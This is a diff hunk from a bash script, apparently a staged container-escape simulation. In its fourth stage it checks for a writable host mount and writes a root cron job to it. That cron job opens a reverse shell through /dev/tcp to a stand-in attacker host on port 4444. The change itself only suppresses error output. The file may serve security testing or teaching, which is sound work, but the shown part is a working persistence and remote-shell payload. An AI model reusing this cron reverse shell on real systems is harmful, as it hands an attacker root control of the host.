@@ -185,7 +185,7 @@ stage_4() {
     if [ -d "$SIMULATED_HOST_MOUNT" ]; then
         echo -e "  - Writable host mount detected at $SIMULATED_HOST_MOUNT!"
         echo -e "  - Attempting host cron-job traversal write..."
-        echo -e "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.local/4444 0>&1'" > "$SIMULATED_HOST_MOUNT/exploit_task"
+        echo -e "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.local/4444 0>&1'" > "$SIMULATED_HOST_MOUNT/exploit_task" 2>/dev/null
         
         if [ $? -eq 0 ]; then
             echo -e "    --> Exploit Task Written successfully to simulated host directory!"
